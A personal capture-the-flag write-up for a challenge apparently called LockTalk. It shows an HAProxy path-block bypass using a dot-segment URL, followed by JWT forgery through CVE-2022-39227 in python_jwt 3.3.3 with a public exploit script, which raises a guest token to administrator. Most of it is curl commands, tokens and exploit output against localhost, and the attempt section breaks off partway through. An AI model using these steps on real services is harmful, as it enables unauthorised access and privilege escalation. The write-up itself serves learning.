# locktalk

In "The Ransomware Dystopia," LockTalk emerges as a beacon of resistance against the rampant chaos inflicted by ransomware groups. In a world plunged into turmoil by malicious cyber threats, LockTalk stands as a formidable force, dedicated to protecting society from the insidious grip of ransomware. Chosen participants, tasked with representing their districts, navigate a perilous landscape fraught with ethical quandaries and treacherous challenges orchestrated by LockTalk. Their journey intertwines with the organization's mission to neutralize ransomware threats and restore order to a fractured world. As players confront internal struggles and external adversaries, their decisions shape the fate of not only themselves but also their fellow citizens, driving them to unravel the mysteries surrounding LockTalk and choose between succumbing to despair or standing resilient against the encroaching darkness.

## Attempt

```py
# config.py
FLAG = "HTB{f4k3_fl4g_f0r_t35t1ng}"
JWT_SECRET_KEY = jwk.JWK.generate(kty='RSA', size=2048)

# middleware.py
token = jwt.verify_jwt(token, current_app.config.get('JWT_SECRET_KEY'), ['PS256'])
# jwt.verify_jwt(jwt, pubkey, allowed_algs)
```

definitely this - https://github.com/davedoesdev/python-jwt

Note: Versions 3.3.4 and later fix a vulnerability (CVE-2022-39227) in JSON Web Token verification 
which lets an attacker with a valid token re-use its signature with modified claims. 
CVE to follow. Please upgrade!

requirements.txt has python_jwt==3.3.3

https://rawgit-now.netlify.app/davedoesdev/python-jwt/master/docs/_build/html/index.html

```sh
curl 'http://localhost:1337/api/v1/get_ticket'

curl 'http://localhost:1337/api/v1/%67et_ticket'

# haproxy.cfg is blocking requests to /api/v1/get_ticket

curl --path-as-is 'http://localhost:1337/api/v1/./get_ticket'
```

```json
{
  "ticket: ": "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxMTY0NTAsImlhdCI6MTcxMDExMjg1MCwianRpIjoiN185dGQ4eGgxOEFPX1p5c0N6WHRVZyIsIm5iZiI6MTcxMDExMjg1MCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.QHP2hH-D_L4WMnyMbU6X6axV-c8ERbX7w6n842Ce8EgtSNFVZ9D6nRx2FjzTVqdseBfc_mfRXLidtGTferdGQdlim3Qof30CpTq132_Xi9Q1csSqYpEJ5sws3TQ2GU8P3sCtiiOhotJehH7UkxzHddszQiKsk9oBqa_j2Hac0HjfyxWMGEEOJ2pkBsPvIjExRgyfge3wKgnifsUgmcWLyhklCD-s4rbNGa4f-UG5MZkF1sSuWhqZz08AYOQ66Puqb4mkJhnFPco6eLQbwuI89Xz0eI80jryYmh9aCLnt-SJU2Hbt1xStWmVPvKir2ZpeASDVlLSsx-D6oyZOe4cgwA"
}

// eyJleHAiOjE3MTAxMTY0NTAsImlhdCI6MTcxMDExMjg1MCwianRpIjoiN185dGQ4eGgxOEFPX1p5c0N6WHRVZyIsIm5iZiI6MTcxMDExMjg1MCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ
{
  "exp": 1710116450,
  "iat": 1710112850,
  "jti": "7_9td8xh18AO_ZysCzXtUg",
  "nbf": 1710112850,
  "role": "guest",
  "user": "guest_user"
}
```

JWT: < Header + '.' + Payload + '.' + Signature


eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9
.
eyJleHAiOjE3MTAxMTY0NTAsImlhdCI6MTcxMDExMjg1MCwianRpIjoiN185dGQ4eGgxOEFPX1p5c0N6WHRVZyIsIm5iZiI6MTcxMDExMjg1MCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ
.
QHP2hH-D_L4WMnyMbU6X6axV-c8ERbX7w6n842Ce8EgtSNFVZ9D6nRx2FjzTVqdseBfc_mfRXLidtGTferdGQdlim3Qof30CpTq132_Xi9Q1csSqYpEJ5sws3TQ2GU8P3sCtiiOhotJehH7UkxzHddszQiKsk9oBqa_j2Hac0HjfyxWMGEEOJ2pkBsPvIjExRgyfge3wKgnifsUgmcWLyhklCD-s4rbNGa4f-UG5MZkF1sSuWhqZz08AYOQ66Puqb4mkJhnFPco6eLQbwuI89Xz0eI80jryYmh9aCLnt-SJU2Hbt1xStWmVPvKir2ZpeASDVlLSsx-D6oyZOe4cgwA

```sh
# add administrator
echo -n '{"exp": 1710116450, "iat": 1710112850, "jti": "7_9td8xh18AO_ZysCzXtUg", "nbf": 1710112850, "role": "administrator", "user": "guest_user"}' | base64
# eyJleHAiOiAxNzEwMTE2NDUwLCAiaWF0IjogMTcxMDExMjg1MCwgImp0aSI6ICI3Xzl0ZDh4aDE4QU9fWnlzQ3pYdFVnIiwgIm5iZiI6IDE3MTAxMTI4NTAsICJyb2xlIjogImFkbWluaXN0cmF0b3IiLCAidXNlciI6ICJndWVzdF91c2VyIn0=

echo -n '{"role": "administrator", "user": "guest_user"}' | base64
# eyJyb2xlIjogImFkbWluaXN0cmF0b3IiLCAidXNlciI6ICJndWVzdF91c2VyIn0=


# eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjogImFkbWluaXN0cmF0b3IiLCAidXNlciI6ICJndWVzdF91c2VyIn0=.QHP2hH-D_L4WMnyMbU6X6axV-c8ERbX7w6n842Ce8EgtSNFVZ9D6nRx2FjzTVqdseBfc_mfRXLidtGTferdGQdlim3Qof30CpTq132_Xi9Q1csSqYpEJ5sws3TQ2GU8P3sCtiiOhotJehH7UkxzHddszQiKsk9oBqa_j2Hac0HjfyxWMGEEOJ2pkBsPvIjExRgyfge3wKgnifsUgmcWLyhklCD-s4rbNGa4f-UG5MZkF1sSuWhqZz08AYOQ66Puqb4mkJhnFPco6eLQbwuI89Xz0eI80jryYmh9aCLnt-SJU2Hbt1xStWmVPvKir2ZpeASDVlLSsx-D6oyZOe4cgwA

curl 'http://localhost:1337/api/v1/flag' -H "Authorization: Bearer eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOiAxNzEwMTE2NDUwLCAiaWF0IjogMTcxMDExMjg1MCwgImp0aSI6ICI3Xzl0ZDh4aDE4QU9fWnlzQ3pYdFVnIiwgIm5iZiI6IDE3MTAxMTI4NTAsICJyb2xlIjogImFkbWluaXN0cmF0b3IiLCAidXNlciI6ICJndWVzdF91c2VyIn0=.QHP2hH-D_L4WMnyMbU6X6axV-c8ERbX7w6n842Ce8EgtSNFVZ9D6nRx2FjzTVqdseBfc_mfRXLidtGTferdGQdlim3Qof30CpTq132_Xi9Q1csSqYpEJ5sws3TQ2GU8P3sCtiiOhotJehH7UkxzHddszQiKsk9oBqa_j2Hac0HjfyxWMGEEOJ2pkBsPvIjExRgyfge3wKgnifsUgmcWLyhklCD-s4rbNGa4f-UG5MZkF1sSuWhqZz08AYOQ66Puqb4mkJhnFPco6eLQbwuI89Xz0eI80jryYmh9aCLnt-SJU2Hbt1xStWmVPvKir2ZpeASDVlLSsx-D6oyZOe4cgwA"
# incorrect padding

curl 'http://localhost:1337/api/v1/flag' -H "Authorization: Bearer eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjogImFkbWluaXN0cmF0b3IiLCAidXNlciI6ICJndWVzdF91c2VyIn0=.QHP2hH-D_L4WMnyMbU6X6axV-c8ERbX7w6n842Ce8EgtSNFVZ9D6nRx2FjzTVqdseBfc_mfRXLidtGTferdGQdlim3Qof30CpTq132_Xi9Q1csSqYpEJ5sws3TQ2GU8P3sCtiiOhotJehH7UkxzHddszQiKsk9oBqa_j2Hac0HjfyxWMGEEOJ2pkBsPvIjExRgyfge3wKgnifsUgmcWLyhklCD-s4rbNGa4f-UG5MZkF1sSuWhqZz08AYOQ66Puqb4mkJhnFPco6eLQbwuI89Xz0eI80jryYmh9aCLnt-SJU2Hbt1xStWmVPvKir2ZpeASDVlLSsx-D6oyZOe4cgwA"
```


```sh
# copied from https://github.com/user0x1337/CVE-2022-39227

python3 exploit.py -i role=administrator -j 'eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxMTY0NTAsImlhdCI6MTcxMDExMjg1MCwianRpIjoiN185dGQ4eGgxOEFPX1p5c0N6WHRVZyIsIm5iZiI6MTcxMDExMjg1MCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.QHP2hH-D_L4WMnyMbU6X6axV-c8ERbX7w6n842Ce8EgtSNFVZ9D6nRx2FjzTVqdseBfc_mfRXLidtGTferdGQdlim3Qof30CpTq132_Xi9Q1csSqYpEJ5sws3TQ2GU8P3sCtiiOhotJehH7UkxzHddszQiKsk9oBqa_j2Hac0HjfyxWMGEEOJ2pkBsPvIjExRgyfge3wKgnifsUgmcWLyhklCD-s4rbNGa4f-UG5MZkF1sSuWhqZz08AYOQ66Puqb4mkJhnFPco6eLQbwuI89Xz0eI80jryYmh9aCLnt-SJU2Hbt1xStWmVPvKir2ZpeASDVlLSsx-D6oyZOe4cgwAeyJleHAiOjE3MTAxMTY0NTAsImlhdCI6MTcxMDExMjg1MCwianRpIjoiN185dGQ4eGgxOEFPX1p5c0N6WHRVZyIsIm5iZiI6MTcxMDExMjg1MCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ'
# [+] New token: {"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxMTY0NTAsImlhdCI6MTcxMDExMjg1MCwianRpIjoiN185dGQ4eGgxOEFPX1p5c0N6WHRVZyIsIm5iZiI6MTcxMDExMjg1MCwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAxMTY0NTAsImlhdCI6MTcxMDExMjg1MCwianRpIjoiN185dGQ4eGgxOEFPX1p5c0N6WHRVZyIsIm5iZiI6MTcxMDExMjg1MCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"QHP2hH-D_L4WMnyMbU6X6axV-c8ERbX7w6n842Ce8EgtSNFVZ9D6nRx2FjzTVqdseBfc_mfRXLidtGTferdGQdlim3Qof30CpTq132_Xi9Q1csSqYpEJ5sws3TQ2GU8P3sCtiiOhotJehH7UkxzHddszQiKsk9oBqa_j2Hac0HjfyxWMGEEOJ2pkBsPvIjExRgyfge3wKgnifsUgmcWLyhklCD-s4rbNGa4f-UG5MZkF1sSuWhqZz08AYOQ66Puqb4mkJhnFPco6eLQbwuI89Xz0eI80jryYmh9aCLnt-SJU2Hbt1xStWmVPvKir2ZpeASDVlLSsx-D6oyZOe4cgwA"}

```

```
Example (HTTP-Cookie):
------------------------------
auth={"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxMTY0NTAsImlhdCI6MTcxMDExMjg1MCwianRpIjoiN185dGQ4eGgxOEFPX1p5c0N6WHRVZyIsIm5iZiI6MTcxMDExMjg1MCwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAxMTY0NTAsImlhdCI6MTcxMDExMjg1MCwianRpIjoiN185dGQ4eGgxOEFPX1p5c0N6WHRVZyIsIm5iZiI6MTcxMDExMjg1MCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"QHP2hH-D_L4WMnyMbU6X6axV-c8ERbX7w6n842Ce8EgtSNFVZ9D6nRx2FjzTVqdseBfc_mfRXLidtGTferdGQdlim3Qof30CpTq132_Xi9Q1csSqYpEJ5sws3TQ2GU8P3sCtiiOhotJehH7UkxzHddszQiKsk9oBqa_j2Hac0HjfyxWMGEEOJ2pkBsPvIjExRgyfge3wKgnifsUgmcWLyhklCD-s4rbNGa4f-UG5MZkF1sSuWhqZz08AYOQ66Puqb4mkJhnFPco6eLQbwuI89Xz0eI80jryYmh9aCLnt-SJU2Hbt1xStWmVPvKir2ZpeASDVlLSsx-D6oyZOe4cgwA"}
```


```json
{
  "  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxMTY0NTAsImlhdCI6MTcxMDExMjg1MCwianRpIjoiN185dGQ4eGgxOEFPX1p5c0N6WHRVZyIsIm5iZiI6MTcxMDExMjg1MCwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.": "",
  "protected": "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9",
  "payload": "eyJleHAiOjE3MTAxMTY0NTAsImlhdCI6MTcxMDExMjg1MCwianRpIjoiN185dGQ4eGgxOEFPX1p5c0N6WHRVZyIsIm5iZiI6MTcxMDExMjg1MCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ",
  "signature": "QHP2hH-D_L4WMnyMbU6X6axV-c8ERbX7w6n842Ce8EgtSNFVZ9D6nRx2FjzTVqdseBfc_mfRXLidtGTferdGQdlim3Qof30CpTq132_Xi9Q1csSqYpEJ5sws3TQ2GU8P3sCtiiOhotJehH7UkxzHddszQiKsk9oBqa_j2Hac0HjfyxWMGEEOJ2pkBsPvIjExRgyfge3wKgnifsUgmcWLyhklCD-s4rbNGa4f-UG5MZkF1sSuWhqZz08AYOQ66Puqb4mkJhnFPco6eLQbwuI89Xz0eI80jryYmh9aCLnt-SJU2Hbt1xStWmVPvKir2ZpeASDVlLSsx-D6oyZOe4cgwA"
}

// eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxMTY0NTAsImlhdCI6MTcxMDExMjg1MCwianRpIjoiN185dGQ4eGgxOEFPX1p5c0N6WHRVZyIsIm5iZiI6MTcxMDExMjg1MCwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.QHP2hH-D_L4WMnyMbU6X6axV-c8ERbX7w6n842Ce8EgtSNFVZ9D6nRx2FjzTVqdseBfc_mfRXLidtGTferdGQdlim3Qof30CpTq132_Xi9Q1csSqYpEJ5sws3TQ2GU8P3sCtiiOhotJehH7UkxzHddszQiKsk9oBqa_j2Hac0HjfyxWMGEEOJ2pkBsPvIjExRgyfge3wKgnifsUgmcWLyhklCD-s4rbNGa4f-UG5MZkF1sSuWhqZz08AYOQ66Puqb4mkJhnFPco6eLQbwuI89Xz0eI80jryYmh9aCLnt-SJU2Hbt1xStWmVPvKir2ZpeASDVlLSsx-D6oyZOe4cgwA
```

```sh
curl 'http://localhost:1337/api/v1/flag' -H "Authorization: Bearer eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxMTY0NTAsImlhdCI6MTcxMDExMjg1MCwianRpIjoiN185dGQ4eGgxOEFPX1p5c0N6WHRVZyIsIm5iZiI6MTcxMDExMjg1MCwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.QHP2hH-D_L4WMnyMbU6X6axV-c8ERbX7w6n842Ce8EgtSNFVZ9D6nRx2FjzTVqdseBfc_mfRXLidtGTferdGQdlim3Qof30CpTq132_Xi9Q1csSqYpEJ5sws3TQ2GU8P3sCtiiOhotJehH7UkxzHddszQiKsk9oBqa_j2Hac0HjfyxWMGEEOJ2pkBsPvIjExRgyfge3wKgnifsUgmcWLyhklCD-s4rbNGa4f-UG5MZkF1sSuWhqZz08AYOQ66Puqb4mkJhnFPco6eLQbwuI89Xz0eI80jryYmh9aCLnt-SJU2Hbt1xStWmVPvKir2ZpeASDVlLSsx-D6oyZOe4cgwA"
```

redo!

```sh
curl --path-as-is 'http://localhost:1337/api/v1/./get_ticket'
# eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxMTkxNDgsImlhdCI6MTcxMDExNTU0OCwianRpIjoiRGJEdHJRU0pXY09EZ3ZhTzV6Rkw2USIsIm5iZiI6MTcxMDExNTU0OCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.AlG5UrwM1TXNXC5trnXCuAehmwru_mW-NqAZ6jjxuh8UtwisvdeV7k9R5AgkyR2bTZVb-v2_S5aQ-zd6MRnUwrPHpnubMBezdVnmBiTs6C1OcAFAFV6l3bIskltVJ8LoL7WNZbhSgUqOf-AWoZ7e_uDnpTMR0k5xoNqTDkReF2tBGgqUlGAQLiLG1-n2ICTQUelfA5waFHv-aNOc9g91dSOe_7nLM1QRwJiG4hQAZzB1cc0JzLZP0NVPORP7USa9TQDtF_FBgTZsweEIbrOGCN3bFsFfnTHiD8fE9lYUfNQQvjShJV-OYwPem1Vf4lYxlmZrDSDARwSLrt2SONlLLg

python3 exploit.py -i role=administrator -j eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxMTkxNDgsImlhdCI6MTcxMDExNTU0OCwianRpIjoiRGJEdHJRU0pXY09EZ3ZhTzV6Rkw2USIsIm5iZiI6MTcxMDExNTU0OCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.AlG5UrwM1TXNXC5trnXCuAehmwru_mW-NqAZ6jjxuh8UtwisvdeV7k9R5AgkyR2bTZVb-v2_S5aQ-zd6MRnUwrPHpnubMBezdVnmBiTs6C1OcAFAFV6l3bIskltVJ8LoL7WNZbhSgUqOf-AWoZ7e_uDnpTMR0k5xoNqTDkReF2tBGgqUlGAQLiLG1-n2ICTQUelfA5waFHv-aNOc9g91dSOe_7nLM1QRwJiG4hQAZzB1cc0JzLZP0NVPORP7USa9TQDtF_FBgTZsweEIbrOGCN3bFsFfnTHiD8fE9lYUfNQQvjShJV-OYwPem1Vf4lYxlmZrDSDARwSLrt2SONlLLg
# {"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxMTkxNDgsImlhdCI6MTcxMDExNTU0OCwianRpIjoiRGJEdHJRU0pXY09EZ3ZhTzV6Rkw2USIsIm5iZiI6MTcxMDExNTU0OCwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAxMTkxNDgsImlhdCI6MTcxMDExNTU0OCwianRpIjoiRGJEdHJRU0pXY09EZ3ZhTzV6Rkw2USIsIm5iZiI6MTcxMDExNTU0OCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"AlG5UrwM1TXNXC5trnXCuAehmwru_mW-NqAZ6jjxuh8UtwisvdeV7k9R5AgkyR2bTZVb-v2_S5aQ-zd6MRnUwrPHpnubMBezdVnmBiTs6C1OcAFAFV6l3bIskltVJ8LoL7WNZbhSgUqOf-AWoZ7e_uDnpTMR0k5xoNqTDkReF2tBGgqUlGAQLiLG1-n2ICTQUelfA5waFHv-aNOc9g91dSOe_7nLM1QRwJiG4hQAZzB1cc0JzLZP0NVPORP7USa9TQDtF_FBgTZsweEIbrOGCN3bFsFfnTHiD8fE9lYUfNQQvjShJV-OYwPem1Vf4lYxlmZrDSDARwSLrt2SONlLLg"}

# eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxMTkxNDgsImlhdCI6MTcxMDExNTU0OCwianRpIjoiRGJEdHJRU0pXY09EZ3ZhTzV6Rkw2USIsIm5iZiI6MTcxMDExNTU0OCwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.AlG5UrwM1TXNXC5trnXCuAehmwru_mW-NqAZ6jjxuh8UtwisvdeV7k9R5AgkyR2bTZVb-v2_S5aQ-zd6MRnUwrPHpnubMBezdVnmBiTs6C1OcAFAFV6l3bIskltVJ8LoL7WNZbhSgUqOf-AWoZ7e_uDnpTMR0k5xoNqTDkReF2tBGgqUlGAQLiLG1-n2ICTQUelfA5waFHv-aNOc9g91dSOe_7nLM1QRwJiG4hQAZzB1cc0JzLZP0NVPORP7USa9TQDtF_FBgTZsweEIbrOGCN3bFsFfnTHiD8fE9lYUfNQQvjShJV-OYwPem1Vf4lYxlmZrDSDARwSLrt2SONlLLg
curl 'http://localhost:1337/api/v1/flag' -H "Authorization: Bearer
```

## Solution

https://youtu.be/EGItzKCxTdQ?si=_g3O8TReB2pIEMRh&t=908

requirements.txt -> python_jwt=3.3.3 CVE - token forgery exploit

haproxy.cfg is blocking requests to /api/v1/get_ticket

use something like this - 'http://localhost:1337/api/v1/./get_ticket'

get token from get_ticket

use https://github.com/user0x1337/CVE-2022-39227 exploit script

run exploit with JWT and `role=administrator` claim

pass payload to get_flag endpoint

I guess I did something wrong in my attempt...
